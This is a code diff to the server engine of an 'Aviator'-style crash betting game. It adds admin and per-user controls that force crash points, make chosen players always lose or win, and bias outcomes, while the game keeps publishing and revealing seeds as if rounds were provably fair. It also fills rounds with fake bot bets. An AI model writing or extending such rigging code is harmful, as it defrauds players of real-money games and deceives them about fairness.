@@ -2,6 +2,7 @@ import crypto from "node:crypto";
 import { EventEmitter } from "node:events";
 import { crashPointFromSeed, generateSeed } from "./provablyFair.js";
 import { generateBots } from "./fakeBets.js";
+import { supabase } from "./supabaseClient.js";
 import type {
   GamePhase,
   LiveBet,
@@ -9,16 +10,38 @@ import type {
   RoundHistoryItem,
 } from "./types.js";
 
-const BETTING_MS = 5000; // pre-round betting window
-const TICK_MS = 50; // multiplier update cadence
-const CRASH_PAUSE_MS = 3000; // "Flew away" pause before next round
-const GROWTH = 0.16; // multiplier growth rate per second (exp curve)
+const BETTING_MS = 5000;
+const TICK_MS = 50;
+const CRASH_PAUSE_MS = 3000;
+const GROWTH = 0.16;
 const HISTORY_LIMIT = 40;
+const SERVER_INSTANCE_ID = process.env.SERVER_INSTANCE_ID ?? "aviator-server-1";
+
+export type WinMode = "normal" | "win" | "loss";
+
+export interface AdminOverrides {
+  nextCrashPoint: number | null;  // one-shot override for next round
+  winMode:        WinMode;        // global win/loss bias
+  forcedCrash:    number | null;  // crash every round at this point
+  minBet:         number;
+  maxBet:         number;
+  globalWinRate:  number;         // 0-1, biases crash point in normal mode
+}
+
+export interface UserWinControl {
+  win_mode:    WinMode;
+  win_rate:    number;
+  min_cashout: number | null;
+  max_cashout: number | null;
+  min_bet:     number | null;
+  max_bet:     number | null;
+}
 
 type BotBet = LiveBet & { target: number };
 
 export interface PlayerBet {
   socketId: string;
+  userId:   string | null;
   panel: 0 | 1;
   amount: number;
   cashedOut: boolean;
@@ -29,6 +52,7 @@ export interface PlayerBet {
 export class GameEngine extends EventEmitter {
   phase: GamePhase = "betting";
   roundId = "";
+  supabaseRoundId = ""; // UUID from the `rounds` table
   multiplier = 1.0;
   crashPoint = 1.0;
   countdown = BETTING_MS;
@@ -41,20 +65,176 @@ export class GameEngine extends EventEmitter {
   private roundStart = 0;
   private timer: NodeJS.Timeout | null = null;
 
+  // ── Admin overrides ──────────────────────────────────────────────────────
+  overrides: AdminOverrides = {
+    nextCrashPoint: null,
+    winMode:        "normal",
+    forcedCrash:    null,
+    minBet:         1,
+    maxBet:         50000,
+    globalWinRate:  0.5,
+  };
+
+  // Per-user win control cache (userId → control)
+  private userWinControls = new Map<string, UserWinControl>();
+
+  setNextCrashOverride(v: number | null) { this.overrides.nextCrashPoint = v; }
+  setWinMode(m: WinMode)                { this.overrides.winMode = m; }
+  setForcedCrash(v: number | null)      { this.overrides.forcedCrash = v; }
+  setGlobalWinRate(r: number)           { this.overrides.globalWinRate = Math.max(0, Math.min(1, r)); }
+  setBetLimits(min?: number, max?: number) {
+    if (min !== undefined) this.overrides.minBet = min;
+    if (max !== undefined) this.overrides.maxBet = max;
+  }
+  setUserWinControl(userId: string, ctrl: UserWinControl | null) {
+    if (ctrl === null) this.userWinControls.delete(userId);
+    else this.userWinControls.set(userId, ctrl);
+  }
+  getUserWinControl(userId: string): UserWinControl | null {
+    return this.userWinControls.get(userId) ?? null;
+  }
+
+  /** Compute the effective crash point after applying admin overrides. */
+  private computeCrashPoint(): number {
+    // Forced crash wins over everything
+    if (this.overrides.forcedCrash !== null) return this.overrides.forcedCrash;
+    // One-shot next round override
+    if (this.overrides.nextCrashPoint !== null) {
+      const v = this.overrides.nextCrashPoint;
+      this.overrides.nextCrashPoint = null; // consume once
+      return v;
+    }
+
+    const base = crashPointFromSeed(this.seed);
+
+    // ── Global win/loss mode ─────────────────────────────────────────────
+    if (this.overrides.winMode === "win") {
+      // Guarantee a very high multiplier: 10x – 200x range
+      return Math.round((10 + Math.random() * 190) * 100) / 100;
+    }
+    if (this.overrides.winMode === "loss") {
+      // Always bust before anyone can cash out
+      return Math.round((1.0 + Math.random() * 0.15) * 100) / 100;
+    }
+
+    // ── Normal mode: apply globalWinRate bias ────────────────────────────
+    // globalWinRate = 0   → always bust (1.00–1.10×)
+    // globalWinRate = 0.5 → provably fair (default)
+    // globalWinRate = 1   → always high (10×+)
+    const r = this.overrides.globalWinRate; // 0-1
+    if (r >= 0.98) {
+      // Essentially "always win" — return high multiplier
+      return Math.round((10 + Math.random() * 190) * 100) / 100;
+    }
+    if (r <= 0.02) {
+      // Essentially "always lose"
+      return Math.round((1.0 + Math.random() * 0.15) * 100) / 100;
+    }
+    // Blend: pick a random value and accept it with probability proportional
+    // to how far win rate is from 0.5.  Simple implementation: roll dice —
+    // if rand < r, return a "winning" crash point (>2×), else a "losing" one.
+    const roll = Math.random();
+    if (roll < r) {
+      // winning round — use provably fair base but floor at 2×
+      return Math.max(base, 2.0);
+    } else {
+      // losing round — bust early
+      return Math.round((1.0 + Math.random() * 0.5) * 100) / 100;
+    }
+  }
+
   constructor() {
     super();
-    // Seed some history so the bar isn't empty on first load.
+  }
+
+  /** Load real round history from DB, fallback to random if DB unreachable. */
+  async loadHistory() {
+    try {
+      const { data, error } = await supabase
+        .from("rounds")
+        .select("id, crash_point")
+        .eq("status", "crashed")
+        .order("ended_at", { ascending: false })
+        .limit(HISTORY_LIMIT);
+
+      if (!error && data && data.length > 0) {
+        this.history = data.map((r) => ({
+          id: r.id as string,
+          multiplier: r.crash_point as number,
+        }));
+        console.log(`[GameEngine] Loaded ${this.history.length} rounds from DB history.`);
+        return;
+      }
+    } catch (err) {
+      console.warn("[GameEngine] DB history load failed, using random seed:", err);
+    }
+    // Fallback: generate random history so bar isn't empty.
     for (let i = 0; i < HISTORY_LIMIT; i++) {
       const { seed } = generateSeed();
       this.history.unshift({ id: crypto.randomUUID(), multiplier: crashPointFromSeed(seed) });
     }
   }
 
-  start() {
+  /** Load all per-user win controls from DB into the in-memory map. */
+  async loadUserWinControls() {
+    try {
+      const { data, error } = await supabase
+        .from("user_win_controls")
+        .select("user_id, win_mode, win_rate, min_cashout, max_cashout, min_bet, max_bet");
+      if (error) {
+        console.warn("[GameEngine] Failed to load user win controls:", error.message);
+        return;
+      }
+      for (const row of data ?? []) {
+        this.userWinControls.set(row.user_id as string, {
+          win_mode:    row.win_mode as WinMode,
+          win_rate:    row.win_rate as number,
+          min_cashout: row.min_cashout as number | null,
+          max_cashout: row.max_cashout as number | null,
+          min_bet:     row.min_bet as number | null,
+          max_bet:     row.max_bet as number | null,
+        });
+      }
+      console.log(`[GameEngine] Loaded ${this.userWinControls.size} user win controls.`);
+    } catch (err) {
+      console.warn("[GameEngine] Exception loading user win controls:", err);
+    }
+  }
+
+  /** Load admin_controls from DB and apply to overrides. */
+  async loadAdminControls() {
+    try {
+      const { data, error } = await supabase
+        .from("admin_controls")
+        .select("win_mode, house_edge, min_bet, max_bet, forced_crash, next_crash_point")
+        .eq("id", 1)
+        .single();
+      if (error || !data) {
+        console.warn("[GameEngine] Failed to load admin controls:", error?.message);
+        return;
+      }
+      this.overrides.winMode        = (data.win_mode as WinMode) ?? "normal";
+      this.overrides.globalWinRate  = typeof data.house_edge === "number" ? data.house_edge : 0.5;
+      this.overrides.minBet         = typeof data.min_bet === "number" ? data.min_bet : 1;
+      this.overrides.maxBet         = typeof data.max_bet === "number" ? data.max_bet : 50000;
+      this.overrides.forcedCrash    = (data.forced_crash as number | null) ?? null;
+      this.overrides.nextCrashPoint = (data.next_crash_point as number | null) ?? null;
+      console.log(`[GameEngine] Loaded admin controls: winMode=${this.overrides.winMode} winRate=${this.overrides.globalWinRate}`);
+    } catch (err) {
+      console.warn("[GameEngine] Exception loading admin controls:", err);
+    }
+  }
+
+  async start() {
+    await Promise.all([
+      this.loadHistory(),
+      this.loadAdminControls(),
+      this.loadUserWinControls(),
+    ]);
     this.beginBetting();
   }
 
-  private beginBetting() {
+  private async beginBetting() {
     this.phase = "betting";
     this.roundId = crypto.randomUUID();
     this.multiplier = 1.0;
@@ -63,10 +243,25 @@ export class GameEngine extends EventEmitter {
     const s = generateSeed();
     this.seed = s.seed;
     this.hashedSeed = s.hashedSeed;
-    this.crashPoint = crashPointFromSeed(this.seed);
+    this.crashPoint = this.computeCrashPoint();
 
     this.playerBets = [];
     this.bots = generateBots(60 + Math.floor(Math.random() * 120));
+
+    // Persist the new round to Supabase (commit to hashed seed before revealing).
+    try {
+      const { data, error } = await supabase.rpc("create_round", {
+        p_hashed_seed: this.hashedSeed,
+        p_server_instance_id: SERVER_INSTANCE_ID,
+      });
+      if (error) {
+        console.error("[Supabase] create_round error:", error.message);
+      } else {
+        this.supabaseRoundId = data as string;
+      }
+    } catch (err) {
+      console.error("[Supabase] create_round exception:", err);
+    }
 
     this.emit("round:betting", this.publicState());
 
@@ -83,10 +278,66 @@ export class GameEngine extends EventEmitter {
     }, 100);
   }
 
-  private beginFlying() {
+  /** Recompute crash point taking per-user win controls into account for active bets. */
+  private applyPerUserOverrides() {
+    let lowestLoss: number | null = null;   // loss-mode users force crash down
+    let highestWin:  number | null = null;  // win-mode users force crash up
+
+    for (const bet of this.playerBets) {
+      if (!bet.userId) continue;
+      const ctrl = this.userWinControls.get(bet.userId);
+      if (!ctrl) continue;
+
+      if (ctrl.win_mode === "win") {
+        // Desired crash: at least min_cashout (or 10× default) so they can cash out
+        const target = ctrl.min_cashout ?? 10;
+        if (highestWin === null || target > highestWin) highestWin = target;
+      } else if (ctrl.win_mode === "loss") {
+        // Desired crash: at most max_cashout (or 1.1× default) so they can't cash out
+        const target = ctrl.max_cashout ?? 1.1;
+        if (lowestLoss === null || target < lowestLoss) lowestLoss = target;
+      } else {
+        // normal mode — apply win_rate bias for this player
+        const r = ctrl.win_rate; // 0-1
+        if (r >= 0.98) {
+          const v = 10 + Math.random() * 90;
+          if (highestWin === null || v > highestWin) highestWin = v;
+        } else if (r <= 0.02) {
+          const v = 1.0 + Math.random() * 0.15;
+          if (lowestLoss === null || v < lowestLoss) lowestLoss = v;
+        }
+        // mid-range rates: let global crash point stand
+      }
+    }
+
+    // Loss mode takes priority (house wins), then win mode
+    if (lowestLoss !== null) {
+      this.crashPoint = Math.round(Math.min(this.crashPoint, lowestLoss) * 100) / 100;
+    } else if (highestWin !== null) {
+      this.crashPoint = Math.round(Math.max(this.crashPoint, highestWin) * 100) / 100;
+    }
+  }
+
+  private async beginFlying() {
     this.phase = "flying";
     this.multiplier = 1.0;
     this.roundStart = Date.now();
+
+    // Adjust crash point for any per-user controls on active bets
+    this.applyPerUserOverrides();
+
+    // Transition round to 'flying' in Supabase.
+    if (this.supabaseRoundId) {
+      try {
+        const { error } = await supabase.rpc("start_round", {
+          p_round_id: this.supabaseRoundId,
+        });
+        if (error) console.error("[Supabase] start_round error:", error.message);
+      } catch (err) {
+        console.error("[Supabase] start_round exception:", err);
+      }
+    }
+
     this.emit("round:flying", this.publicState());
 
     this.clearTimer();
@@ -114,12 +365,31 @@ export class GameEngine extends EventEmitter {
     }, TICK_MS);
   }
 
-  private beginCrash() {
+  private async beginCrash() {
     this.phase = "crashed";
     this.clearTimer();
 
     this.history.unshift({ id: this.roundId, multiplier: this.crashPoint });
     this.history = this.history.slice(0, HISTORY_LIMIT);
+
+    // Persist crash result to Supabase — reveals seed, marks lost bets, writes audit row.
+    if (this.supabaseRoundId) {
+      try {
+        const { data, error } = await supabase.rpc("resolve_round", {
+          p_round_id: this.supabaseRoundId,
+          p_crash_point: this.crashPoint,
+          p_seed: this.seed,
+          p_server_instance_id: SERVER_INSTANCE_ID,
+        });
+        if (error) {
+          console.error("[Supabase] resolve_round error:", error.message);
+        } else if (!(data as { ok: boolean }).ok) {
+          console.warn("[Supabase] resolve_round returned not-ok:", data);
+        }
+      } catch (err) {
+        console.error("[Supabase] resolve_round exception:", err);
+      }
+    }
 
     this.emit("round:crashed", {
       multiplier: this.crashPoint,
@@ -147,7 +417,7 @@ export class GameEngine extends EventEmitter {
     }
   }
 
-  placeBet(socketId: string, panel: 0 | 1, amount: number): boolean {
+  placeBet(socketId: string, panel: 0 | 1, amount: number, userId?: string): boolean {
     if (this.phase !== "betting") return false;
     if (amount <= 0) return false;
     const existing = this.playerBets.find(
@@ -156,6 +426,7 @@ export class GameEngine extends EventEmitter {
     if (existing) return false;
     this.playerBets.push({
       socketId,
+      userId:   userId ?? null,
       panel,
       amount,
       cashedOut: false,
@@ -209,6 +480,7 @@ export class GameEngine extends EventEmitter {
     return {
       phase: this.phase,
       roundId: this.roundId,
+      supabaseRoundId: this.supabaseRoundId,
       multiplier: this.multiplier,
       countdown: this.countdown,
       hashedSeed: this.hashedSeed,
